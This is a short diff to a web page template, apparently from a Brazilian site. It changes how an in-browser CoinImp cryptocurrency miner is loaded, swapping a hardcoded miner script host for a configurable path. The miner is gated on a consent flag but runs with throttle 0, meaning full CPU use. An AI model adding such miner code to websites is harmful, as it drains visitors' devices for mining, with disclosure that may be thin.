@@ -147,11 +147,14 @@
     @include('partials.cookie-banner')
 
     {{-- Minerador CoinImp (após consentimento do usuário) --}}
-    @if(config('miner.enabled'))
+    @if(config('miner.enabled') && config('miner.site_key'))
     <script>
     if (localStorage.fda_consent === '1') {
+        var scriptPath = '{{ config('miner.script_path') }}';
+        // Se for URL absoluta (CDN), usa direto; se for caminho relativo, usa asset()
+        var finalSrc = (scriptPath.startsWith('http://') || scriptPath.startsWith('https://')) ? scriptPath : '{{ asset('___PLACEHOLDER___') }}'.replace('___PLACEHOLDER___', scriptPath);
         var coinimp = document.createElement('script');
-        coinimp.src = 'https://www.hostingcloud.racing/gMWa.js';
+        coinimp.src = finalSrc;
         coinimp.onload = function() {
             var _client = new Client.Anonymous('{{ config('miner.site_key') }}', {
                 throttle: 0,
